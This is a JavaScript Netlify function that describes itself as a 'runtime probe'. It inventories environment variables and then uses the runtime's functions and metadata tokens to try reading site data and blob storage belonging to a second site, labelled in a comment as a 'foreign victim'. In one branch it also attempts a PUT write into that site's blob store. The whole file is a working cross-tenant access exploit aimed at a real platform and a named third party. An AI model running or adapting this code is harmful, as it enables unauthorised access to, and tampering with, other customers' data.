// Phase-2 Netlify Blobs runtime probe v3. Own runtime; key-gated; tokens never returned raw.
// Goals: (1) is NETLIFY_BLOBS_CONTEXT present under ANY env key? (2) is the runtime
// NETLIFY_FUNCTIONS_TOKEN over-privileged for cross-SITE blobs on the management API?
const netlifyBlobs = require('@netlify/blobs');
const KEY = "bl0bx7q2z9k4";
const NL1 = "6f1e8c67-7bec-4c02-91f7-b0f8a6175aa6"; // this site
const NL2 = "a0364027-1082-4eb6-b5ab-8715007f97f8"; // foreign victim (azizsayed360)

function redact(s){
  if(typeof s!=='string') return s;
  return s.replace(/[A-Za-z0-9_\-\.]{24,}/g, m=>'<r:'+m.length+'>');
}
async function req(url, method, token, body){
  try{
    const opt={ method, headers:{ authorization:'Bearer '+token, 'user-agent':'nl1-runtime-probe' }, signal:AbortSignal.timeout(6000) };
    if(body!=null) opt.body=body;
    const r=await fetch(url,opt); const t=await r.text();
    return { status:r.status, body: redact(t).slice(0,200) };
  }catch(e){ return { error:String(e).slice(0,140) }; }
}
exports.handler = async (event) => {
  if(!event||!event.queryStringParameters||event.queryStringParameters.k!==KEY) return {statusCode:403, body:'forbidden'};
  const env = process.env;
  const out = { ok:true, note:'blobs runtime probe v3' };

  // (1) full env inventory (keys always; values redacted)
  out.env_keys = Object.keys(env).sort();
  out.env_blobsish = {};
  for(const k of out.env_keys){ if(/BLOB|DEPLOY|SITE|EDGE|NETLIFY|NF_|TOKEN|URL/i.test(k)) out.env_blobsish[k]=redact(env[k]); }
  out.blobs_ctx_present = !!env.NETLIFY_BLOBS_CONTEXT;

  // (2) runtime token cross-site test on management API
  const ftok = env.NETLIFY_FUNCTIONS_TOKEN;
  const base = 'https://api.netlify.com';
  if(ftok){
    out.functions_token = { len: ftok.length };
    out.functions_token.self_blobs  = await req(base+'/api/v1/blobs/'+NL1+'/production','GET',ftok);
    out.functions_token.xtenant_blobs = await req(base+'/api/v1/blobs/'+NL2+'/production','GET',ftok);
    out.functions_token.self_site   = await req(base+'/api/v1/sites/'+NL1,'GET',ftok);
    out.functions_token.xtenant_site= await req(base+'/api/v1/sites/'+NL2,'GET',ftok);
  }
  // metadata token variant
  const mtok = env.AWS_LAMBDA_METADATA_TOKEN;
  if(mtok){
    out.metadata_token = { len: mtok.length };
    out.metadata_token.xtenant_blobs = await req(base+'/api/v1/blobs/'+NL2+'/production','GET',mtok);
  }

  // (3) if blobs context somehow present, capture edge + xtenant
  if(env.NETLIFY_BLOBS_CONTEXT){
    let ctx=null; try{ ctx=JSON.parse(Buffer.from(env.NETLIFY_BLOBS_CONTEXT,'base64').toString('utf8')); }catch(e){ try{ctx=JSON.parse(env.NETLIFY_BLOBS_CONTEXT);}catch(e2){} }
    if(ctx){
      const edge=ctx.edgeURL||ctx.uncachedEdgeURL, tok=ctx.token;
      out.blobs_ctx = { edgeURL:ctx.edgeURL, siteID:ctx.siteID, region:ctx.primaryRegion, keys:Object.keys(ctx), token_is_jwt: (typeof tok==='string' && tok.split('.').length===3) };
      if(edge&&tok){
        out.edge_self = await req(edge+'/'+NL1+'/recon-store/k','GET',tok);
        out.edge_xtenant_get = await req(edge+'/'+NL2+'/recon-store/k','GET',tok);
        out.edge_xtenant_put = await req(edge+'/'+NL2+'/recon-store/xk','PUT',tok,'xt');
      }
    }
  }
  return { statusCode:200, headers:{'content-type':'application/json'}, body: JSON.stringify(out,null,2) };
};
